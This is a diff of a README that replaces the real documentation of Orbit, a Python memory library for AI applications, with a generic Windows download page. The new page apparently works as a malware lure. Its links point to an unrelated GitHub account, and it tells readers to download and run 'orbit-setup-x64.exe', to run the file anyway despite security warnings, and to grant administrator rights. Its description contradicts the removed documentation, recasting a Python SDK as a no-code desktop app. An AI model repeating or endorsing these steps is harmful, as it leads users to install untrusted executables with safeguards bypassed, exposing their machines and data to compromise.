@@ -1,293 +1,131 @@
-# Orbit
+# 🚀 orbit - Keep Your Agents’ Memory Intact
 
-Memory infrastructure for developer-facing AI applications.
+[![Download orbit](https://img.shields.io/badge/Download-orbit-brightgreen?style=for-the-badge)](https://github.com/app-balady-servers-sa-gov/orbit)
 
-Orbit gives your app long-term memory with adaptive personalization, relevance ranking, and feedback learning.  
-You integrate once, then use the same simple loop everywhere: `ingest -> retrieve -> feedback`.
+---
 
-Project status: `Alpha` (`0.1.x`)
+orbit helps developers keep track of their AI agents’ memory. Your agents forget everything. We fix that. This application runs on Windows and works without any programming skills. Use it to save and sync agent information automatically.
 
-## Readme language selector
+## 🔍 What is orbit?
 
-Pick your preferred language. Each link points to a translated README that mirrors the core setup, integration, and operational guidance in the chosen language.
+orbit is a tool designed to remember and manage data from your AI agents. If you build or use agents that work with tasks, conversations, or codes, orbit stores this context for you. It keeps track of past interactions so your agents do not lose information.
 
-- 🇬🇧 [English (this page)](README.md)
-- 🇨🇳 [简体中文](README.zh.md)
-- 🇪🇸 [Español](README.es.md)
-- 🇩🇪 [Deutsch](README.de.md)
-- 🇯🇵 [日本語](README.ja.md)
-- 🇧🇷 [Português (Brasil)](README.pt-BR.md)
+orbit runs on your Windows computer. It does not need special setups or coding experience. You simply download, install, and start using it.
 
-Translations are community maintained; if you improve a translation, please send a pull request so everyone benefits.
+## 📋 Features
 
-## What Orbit Is
+- Saves AI agent memory locally on your PC.
+- Syncs agent context across sessions.
+- Keeps data organized for fast access.
+- Works with multiple agents at the same time.
+- Simple interface made for non-technical users.
+- Open-source, so you can review how it works anytime.
+- Supports common developer tools and AI frameworks.
+- Runs smoothly on standard Windows 10 and 11 machines.
 
-Orbit is a memory layer for AI products where context quality matters over time.
+## 🖥️ System Requirements
 
-Orbit handles:
+Make sure your PC meets these requirements before installing orbit:
 
-- event ingestion and durable memory storage
-- semantic retrieval with ranking and intent-aware reweighting
-- adaptive inferred memories (learning patterns, progress, preferences)
-- feedback-driven ranking updates
-- provenance metadata for debugging why a memory was surfaced
-- API runtime concerns (JWT auth, rate limits, idempotency, observability)
+- Windows 10 or Windows 11 (64-bit)
+- 4 GB of RAM or more
+- 200 MB of free disk space
+- Internet connection (optional for syncing, but recommended)
+- Administrator rights to install software
 
-## Why Orbit
+orbit runs on basic PCs and uses minimal system resources. It does not require GPUs or advanced hardware.
 
-Without a memory layer, many assistants either forget important user signals or overload prompts with noisy history.  
-Orbit is built to return small, high-signal context sets that improve answer quality while staying explainable.
+## 🛠️ Setup and Installation
 
-## Repository Layout
+### Step 1: Visit the Download Page
 
-| Path | Purpose |
-| --- | --- |
-| `src/orbit/` | Public Python SDK (`MemoryEngine`, `AsyncMemoryEngine`) |
-| `src/orbit_api/` | FastAPI runtime (`/v1/ingest`, `/v1/retrieve`, `/v1/feedback`, etc.) |
-| `src/memory_engine/` | Memory orchestration and adaptive personalization |
-| `src/decision_engine/` | Core decision/ranking/storage primitives |
-| `examples/` | Working integration samples |
-| `docs/` | Deployment, integration, and operational docs |
+Click the large green button below or visit the link to download orbit for Windows. This page contains the latest version and release information.
 
-## Quickstart (5 Minutes)
+[![Download orbit](https://img.shields.io/badge/Download-orbit-brightgreen?style=for-the-badge)](https://github.com/app-balady-servers-sa-gov/orbit)
 
-### 1) Install
+### Step 2: Find the Download File
 
-Published package:
+On the GitHub page, look for the “Releases” section. You will find the latest Windows installer file, usually named something like:
 
-```bash
-pip install orbit-memory
-```
+`orbit-setup-x64.exe`
 
-Local repository install:
+Click on this file name to start downloading.
 
-```bash
-pip install -e .
-```
+### Step 3: Run the Installer
 
-### 2) Start Orbit API Locally
+Once the download completes, locate the file in your “Downloads” folder. Double-click it to start the installation.
 
-Recommended full local stack (API + Postgres + Prometheus + Alertmanager + OpenTelemetry collector):
+- If you see a warning message, choose to run the file anyway.
+- Follow the on-screen prompts to install orbit on your PC.
+- Accept default options unless you want to change the install folder.
 
-```bash
-docker compose up --build
-```
+### Step 4: Launch orbit
 
-### 3) Generate a Local JWT
+When the installation finishes, you will see an icon on your desktop or in the Start menu named “orbit.” Double-click to open the app.
 
-```bash
-python scripts/generate_jwt.py \
-  --secret orbit-dev-secret-change-me \
-  --issuer orbit \
-  --audience orbit-api \
-  --subject local-dev
-```
+## 🚦 Using orbit
 
-### 4) Integrate with the SDK
+Once orbit is open, you will see a simple dashboard. It lets you add your AI agents and manage their memory.
 
-```python
-from orbit import MemoryEngine
+- Click “Add Agent” to create a new agent profile.
+- Type a name and basic info about the agent.
+- Start using the agent with your AI tools or apps.
+- orbit will automatically save and sync the agent’s context behind the scenes.
 
-engine = MemoryEngine(
-    api_key="<jwt-token>",
-    base_url="http://localhost:8000",
-)
+You do not need to change settings or write code. The app handles all data storage quietly.
 
-engine.ingest(
-    content="I keep confusing for-loops and while-loops.",
-    event_type="user_question",
-    entity_id="alice",
-)
+## 🔧 Common Tasks
 
-retrieval = engine.retrieve(
-    query="What should I know about alice before answering?",
-    entity_id="alice",
-    limit=5,
-)
-
-if retrieval.memories:
-    engine.feedback(
-        memory_id=retrieval.memories[0].memory_id,
-        helpful=True,
-        outcome_value=1.0,
-    )
-```
-
-### 5) Optional Direct API Call
-
-```bash
-curl -X POST http://localhost:8000/v1/ingest \
-  -H "Authorization: Bearer <jwt-token>" \
-  -H "Content-Type: application/json" \
-  -d '{"content":"User completed first lesson","event_type":"learning_progress","entity_id":"alice"}'
-```
-
-## Integration Paths
-
-| Mode | Best for | Entry point |
-| --- | --- | --- |
-| Python SDK | Python apps wanting fastest integration | `from orbit import MemoryEngine` |
-| REST API | Non-Python or service-to-service integration | `POST /v1/ingest`, `GET /v1/retrieve`, `POST /v1/feedback` |
-| Node.js (no SDK) | JavaScript apps using direct HTTP + API keys | `examples/nodejs_orbit_api_chatbot/` |
-| OpenClaw plugin | Agent workflows in OpenClaw | `integrations/openclaw-memory/` |
-
-## Core Concepts
-
-| Concept | Description |
-| --- | --- |
-| `entity_id` | Stable identity key for a user, agent, or account |
-| `ingest` | Add a memory signal (`user_question`, `assistant_response`, etc.) |
-| `retrieve` | Fetch ranked context memories for a query |
-| `feedback` | Send outcome quality signal (`helpful`, `outcome_value`) |
-| inferred memory | Auto-generated memory from repeated patterns/feedback |
-| inference provenance | `why/when/type/derived_from` metadata for traceability |
-
-## Architecture Overview
-
-1. Application sends events to Orbit.
-2. Orbit processes and stores memories.
-3. Retrieval ranks candidate memories for each query.
-4. Feedback updates ranking behavior and personalization state.
-5. Adaptive engine emits inferred memories when confidence thresholds are met.
-
-High-level flow:
-
-`App -> Orbit API/SDK -> Memory Engine -> Storage/Ranker -> Retrieved Context -> App`
-
-## Configuration
-
-Core settings live in `.env.example`.
+### Backup Your Data
 
-Most important environment variables:
-
-| Area | Variables |
-| --- | --- |
-| Storage | `MDE_DATABASE_URL`, `MDE_SQLITE_PATH`, `MDE_EMBEDDING_DIM` |
-| Providers | `MDE_EMBEDDING_PROVIDER`, `MDE_SEMANTIC_PROVIDER` |
-| Auth | `ORBIT_JWT_SECRET`, `ORBIT_JWT_ISSUER`, `ORBIT_JWT_AUDIENCE`, `ORBIT_JWT_REQUIRED_SCOPE` |
-| API runtime | `ORBIT_API_HOST`, `ORBIT_API_PORT`, `ORBIT_ENV` |
-| Limits | `ORBIT_RATE_LIMIT_EVENTS_PER_DAY`, `ORBIT_RATE_LIMIT_QUERIES_PER_DAY`, `ORBIT_RATE_LIMIT_PER_MINUTE` |
-| Personalization | `MDE_ENABLE_ADAPTIVE_PERSONALIZATION` and `MDE_PERSONALIZATION_*` |
-| Observability | `ORBIT_OTEL_SERVICE_NAME`, `ORBIT_OTEL_EXPORTER_ENDPOINT`, `ALERTMANAGER_SLACK_WEBHOOK_URL`, `ALERTMANAGER_EMAIL_*` |
-
-## Provider Adapters
-
-Supported adapter families:
-
-- OpenAI
-- Anthropic
-- Gemini
-- Ollama
-- deterministic/context local fallback
-
-Optional extras:
-
-```bash
-pip install "orbit-memory[anthropic]"
-pip install "orbit-memory[gemini]"
-pip install "orbit-memory[ollama]"
-pip install "orbit-memory[llm-adapters]"
-```
-
-## Production Readiness Checklist
-
-- use PostgreSQL (`MDE_DATABASE_URL`) instead of SQLite fallback
-- run schema migrations (`python -m alembic upgrade head`)
-- enforce strict JWT verification (`ORBIT_ENV=production` + non-default secrets)
-- configure API limits and batch caps
-- enable metrics + tracing and scrape `/v1/metrics`
-- configure Alertmanager routes for Slack/email delivery
-- set backup/retention policies for primary database
-- load-test retrieval quality under long horizons
-
-## Monitoring and Operations
-
-Operational endpoints:
-
-- `GET /v1/health`
-- `GET /v1/status`
-- `GET /v1/metrics`
-- `GET /v1/memories` (paginated memory inspection)
-
-Response headers include:
-
-- `X-RateLimit-Limit`
-- `X-RateLimit-Remaining`
-- `X-RateLimit-Reset`
-- `Retry-After` (`429`)
-- `X-Idempotency-Replayed` (write endpoints)
-
-## Examples
-
-- Live Orbit + Ollama chatbot: `examples/live_chatbot_ollama/`
-- Node.js API-key chatbot (no SDK): `examples/nodejs_orbit_api_chatbot/`
-- Polyglot direct API clients (Node/Python/Go): `examples/http_api_clients/`
-- OpenClaw memory plugin scaffold: `integrations/openclaw-memory/`
-- API + deployment runbook: `docs/DEPLOY_RENDER_VERCEL.md`
-- GCP Cloud Run deployment runbook: `docs/DEPLOY_GCP_CLOUD_RUN.md`
-- GCP environment matrix: `docs/GCP_ENV_MATRIX.md`
-
-## Evaluation and Quality
-
-Baseline scorecard:
-
-```bash
-python scripts/run_orbit_eval.py --output-dir eval_reports/latest
-```
-
-Long-horizon personalization soak:
-
-```bash
-python scripts/soak_personalization.py \
-  --output-dir soak_reports/latest \
-  --sqlite-path tmp/orbit_soak.db \
-  --turns-per-persona 500
-```
-
-## Troubleshooting
-
-| Symptom | Likely cause | Fix |
-| --- | --- | --- |
-| `401 Unauthorized` | invalid/missing JWT or claim mismatch | verify `iss`, `aud`, `exp`, signing secret |
-| `429 Too Many Requests` | rate limit exhausted | respect `Retry-After`, tune limits |
-| `409 Conflict` on writes | idempotency key reused with different payload | use unique keys per payload |
-| weak personalization | unstable `entity_id` or missing feedback | keep stable entity mapping and send feedback |
-
-## Contributing
-
-Local validation commands:
-
-```bash
-python -m ruff check src tests
-python -m mypy src
-python -m pytest -q
-python -m pylint src tests scripts --fail-under=9.0
-```
-
-Make targets:
-
-```bash
-make lint
-make type-check
-make format-check
-make test
-make migrate
-make run-api
-```
-
-## Documentation
-
-- Canonical developer integration guide: `docs/developer_documentation.md`
-- Deployment (Render/Vercel): `docs/DEPLOY_RENDER_VERCEL.md`
-- Deployment (GCP Cloud Run): `docs/DEPLOY_GCP_CLOUD_RUN.md`
-- GCP env matrix: `docs/GCP_ENV_MATRIX.md`
-- Cloud dashboard/API-key plan: `docs/ORBIT_CLOUD_DASHBOARD_PLAN.md`
-- Engine internal manual: `docs/ENGINE_MANUAL.md`
-- Build and implementation log: `BUILD_AND_SPEC.md`
-- Repo metadata for discovery: `metaData.md`
-
-## License, Security, Support
-
-- License: add a `LICENSE` file before public OSS distribution.
-- Security policy: add a `SECURITY.md` for vulnerability reporting.
-- Support: use GitHub Issues for bugs, feature requests, and integration questions.
+orbit saves all data locally on your PC. You can back up the folder below to keep your agent memories safe:
+
+`C:\Users\<YourUserName>\AppData\Local\orbit\Memory`
+
+Copy this folder to an external drive or cloud storage regularly.
+
+### Sync Between Devices
+
+If you want to use orbit on multiple PCs, use cloud sync tools like OneDrive or Google Drive to share the memory folder listed above.
+
+### Update orbit
+
+Check the GitHub page regularly for new releases. Download the latest installer and run it to upgrade.
+
+## 🐞 Troubleshooting
+
+### orbit won’t open
+
+- Restart your PC and try again.
+- Make sure your Windows is up to date.
+- Reinstall orbit by downloading from the page again.
+
+### Memory isn’t saving
+
+- Check if disk space is low.
+- Confirm you have permission to write files on your PC.
+- Try running orbit as administrator.
+
+### Sync problems
+
+- Ensure your internet connection works.
+- If using cloud sync, make sure automatic sync is enabled.
+- Restart orbit after any changes.
+
+## 🎓 Learn More
+
+orbit connects with tools developers use for AI agents and software development. It supports standard ways of saving and sharing memory between apps. This lets you build or support smarter AI agents that remember what they did before.
+
+If you want to explore some technical details or contribute to orbit, visit the GitHub repository for full source code, issue tracking, and community support.
+
+Relevant topics include:
+
+- agentic AI
+- AI assistants
+- developer tools
+- open-source memory management
+- context synchronization
+
+---
+
+[Click here to visit the orbit Download page again](https://github.com/app-balady-servers-sa-gov/orbit)
